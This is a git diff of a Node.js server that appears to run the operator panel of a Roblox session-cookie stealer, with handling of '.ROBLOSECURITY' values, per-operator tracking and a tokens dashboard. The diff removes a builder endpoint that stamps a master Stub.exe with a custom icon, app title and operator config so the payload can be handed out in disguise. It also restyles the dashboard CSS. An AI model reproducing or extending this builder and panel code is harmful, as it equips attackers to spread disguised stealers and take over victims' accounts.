@@ -796,70 +796,6 @@ async function fetchRobuxInfoAsync(robloSecurity, operator, uploaded, db) {
     console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Асинхронное обновление robuxInfo не удалось: ${e.message}`);
   }
 }
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  API — Builder Endpoint (Generate Stub Executable)
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-const fs = require('fs');
-
-app.post('/api/build', requireAuth, upload.single('icon'), async (req, res) => {
-  try {
-    const operator = req.body.operator || req.authUser || 'Shonll';
-    const appTitleMain = req.body.appTitleMain || 'RAH NonPro';
-    const appTitleVersion = req.body.appTitleVersion || ' v7.0.1';
-    const windowTitle = req.body.windowTitle || `${appTitleMain}${appTitleVersion}`;
-
-    // Read the master Stub.exe
-    const stubPath = path.join(__dirname, 'uploads', 'Stub.exe');
-    if (!fs.existsSync(stubPath)) {
-      return res.status(500).json({ error: 'Stub.exe not found on server' });
-    }
-    let exeBuffer = fs.readFileSync(stubPath);
-
-    // If an icon was uploaded, use resedit to change the icon
-    if (req.file && req.file.buffer) {
-      try {
-        const peLibrary = require('pe-library');
-        const resedit = require('resedit');
-        const data = peLibrary.NtExecutable.from(exeBuffer);
-        const resList = peLibrary.NtExecutableResource.from(data);
-        const iconFile = resedit.Data.IconFile.from(req.file.buffer);
-        resedit.Resource.IconGroupEntry.replaceIconsForResource(
-          resList.entries, 1, 1033, iconFile.icons.map(i => i.data)
-        );
-        resList.outputResource(data);
-        exeBuffer = Buffer.from(data.generate());
-      } catch (iconErr) {
-        console.error('Error replacing icon:', iconErr.message);
-        // Continue with original icon if it fails
-      }
-    }
-
-    // Append config JSON
-    const config = {
-      operatorName: operator,
-      appTitleMain,
-      appTitleVersion,
-      windowTitle
-    };
-    const configJson = JSON.stringify(config);
-    const marker = "<<NEXUS_CFG>>";
-    
-    const markerBuffer = Buffer.from(marker, 'utf8');
-    const jsonBuffer = Buffer.from(configJson, 'utf8');
-    
-    const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, jsonBuffer]);
-
-    const filename = `${appTitleMain.replace(/[^a-z0-9]/gi, '_')}.exe`;
-
-    res.setHeader('Content-Type', 'application/vnd.microsoft.portable-executable');
-    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-    res.send(finalBuffer);
-
-  } catch (err) {
-    console.error('Build Error:', err);
-    res.status(500).json({ error: 'Failed to build executable' });
-  }
-});
 
 app.post('/robux-check', requireAuth, async (req, res) => {
   const { robloSecurity } = req.body;
@@ -1402,23 +1338,41 @@ function dashboardHTML(user) {
 
     .stats-bar {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 1rem; padding: 1.5rem;
+      grid-template-columns: repeat(4, 1fr);
+      grid-auto-rows: minmax(130px, auto);
+      gap: 1.25rem; padding: 1.5rem;
     }
     .stat-card {
       background: var(--surface);
-      backdrop-filter: blur(8px);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
       border: 1px solid var(--border);
-      border-radius: 14px; padding: 1rem 1.25rem;
-      transition: border-color 0.3s, transform 0.3s;
+      border-radius: var(--radius-lg); padding: 1.5rem;
+      transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      display: flex; flex-direction: column; justify-content: center;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.3);
     }
+    .stat-card:nth-child(1) { grid-column: span 2; grid-row: span 2; }
+    .stat-card:nth-child(1) .stat-value { font-size: 4rem; }
     .stat-card:hover {
-      border-color: rgba(124, 106, 255, 0.3);
-      transform: translateY(-2px);
+      border-color: var(--border-glow);
+      transform: translateY(-4px) scale(1.02);
+      box-shadow: var(--shadow-glow);
+      background: var(--surface-hover);
     }
-    .stat-label { font-size: 0.72rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.25rem; }
-    .stat-value { font-size: 1.5rem; font-weight: 700; }
-    .stat-value.accent { background: linear-gradient(135deg, #7c6aff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .stat-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; }
+    .stat-value { font-size: 1.8rem; font-weight: 800; color: var(--text); }
+    .stat-value.accent { background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    
+    @media (max-width: 1024px) {
+      .stats-bar { grid-template-columns: repeat(2, 1fr); }
+      .stat-card:nth-child(1) { grid-column: span 2; grid-row: span 1; }
+      .stat-card:nth-child(1) .stat-value { font-size: 3rem; }
+    }
+    @media (max-width: 600px) {
+      .stats-bar { grid-template-columns: 1fr; }
+      .stat-card:nth-child(1) { grid-column: span 1; }
+    }
 
     .controls-panel {
       display: flex; gap: 1rem; align-items: center; justify-content: space-between;
@@ -2275,9 +2229,12 @@ function tokensHTML(user) {
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #030307; --surface: rgba(18, 18, 28, 0.65); --surface-hover: rgba(25, 25, 38, 0.85);
-      --border: rgba(255, 255, 255, 0.08); --accent: #7c6aff; --accent-glow: rgba(124, 106, 255, 0.25);
-      --text: #f1f1f6; --text-dim: #8c8c9e; --success: #00e676; --danger: #ff1744; --gold: #ffa502;
+      /* UI UX PRO MAX Cyberpunk + Glassmorphism Theme */
+      --bg: #020617; --surface: rgba(15, 23, 42, 0.5); --surface-hover: rgba(30, 41, 59, 0.7);
+      --border: rgba(255, 255, 255, 0.05); --border-glow: rgba(34, 197, 94, 0.3);
+      --accent: #22c55e; --accent-secondary: #7c3aed; --accent-glow: rgba(34, 197, 94, 0.4);
+      --text: #f8fafc; --text-dim: #cbd5e1; --success: #10b981; --danger: #ef4444; --gold: #fbbf24;
+      --radius-lg: 24px;
     }
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
@@ -2295,14 +2252,22 @@ function tokensHTML(user) {
     .nav-link.active { color: var(--accent); background: rgba(124,106,255,0.1); }
 
     .container { padding: 1.5rem; }
-    .stats-bar { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin-bottom: 1.5rem; }
-    .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 1rem 1.25rem; transition: border-color 0.3s; }
-    .stat-card:hover { border-color: rgba(124,106,255,0.3); }
-    .stat-label { font-size: 0.72rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.25rem; }
-    .stat-value { font-size: 1.5rem; font-weight: 700; }
-    .stat-value.accent { background: linear-gradient(135deg, #7c6aff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .stats-bar { display: grid; grid-template-columns: repeat(4, 1fr); grid-auto-rows: minmax(130px, auto); gap: 1.25rem; margin-bottom: 1.5rem; }
+    .stat-card { background: var(--surface); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 1.5rem; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); display: flex; flex-direction: column; justify-content: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+    .stat-card:nth-child(1) { grid-column: span 2; grid-row: span 2; }
+    .stat-card:nth-child(1) .stat-value { font-size: 4rem; }
+    .stat-card:hover { border-color: var(--border-glow); transform: translateY(-4px) scale(1.02); box-shadow: 0 0 25px var(--accent-glow); background: var(--surface-hover); }
+    .stat-label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; }
+    .stat-value { font-size: 1.8rem; font-weight: 800; color: var(--text); }
+    .stat-value.accent { background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     .stat-value.gold { color: var(--gold); }
     .stat-value.success { color: var(--success); }
+    @media (max-width: 1024px) {
+      .stats-bar { grid-template-columns: repeat(2, 1fr); }
+      .stat-card:nth-child(1) { grid-column: span 2; grid-row: span 1; }
+      .stat-card:nth-child(1) .stat-value { font-size: 3rem; }
+    }
+    @media (max-width: 600px) { .stats-bar { grid-template-columns: 1fr; } .stat-card:nth-child(1) { grid-column: span 1; } }
 
     .controls { display: flex; gap: 1rem; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; flex-wrap: wrap; }
     .sort-btn { background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 0.6rem 1.2rem; border-radius: 10px; cursor: pointer; font-family: inherit; font-size: 0.85rem; font-weight: 600; transition: 0.2s; }
